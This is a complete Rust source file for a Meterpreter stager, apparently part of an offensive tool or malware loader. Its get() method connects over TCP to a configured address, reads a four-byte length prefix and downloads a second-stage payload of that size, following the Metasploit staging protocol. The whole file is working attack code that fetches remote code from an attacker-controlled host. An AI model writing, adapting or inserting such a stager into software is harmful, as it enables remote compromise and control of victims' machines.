use std::io::prelude::*;
use std::net::TcpStream;

use super::Stager;

pub struct MeterpreterStager {
    address: String,
}

impl MeterpreterStager {
    pub fn new<S: Into<String>>(address: S) -> Self {
        Self {
            address: address.into(),
        }
    }
}

impl Stager for MeterpreterStager {
    type Error = std::io::Error;
    fn get(&mut self) -> Result<Vec<u8>, Self::Error> {
        let mut stream = TcpStream::connect(&self.address)?;
        let mut buff = [0u8; 4];

        stream.read_exact(&mut buff)?;
        let payload_length = u32::from_le_bytes(buff);

        let mut payload = vec![0u8; payload_length as usize];
        stream.read_exact(&mut payload)?;

        Ok(payload)
    }
}
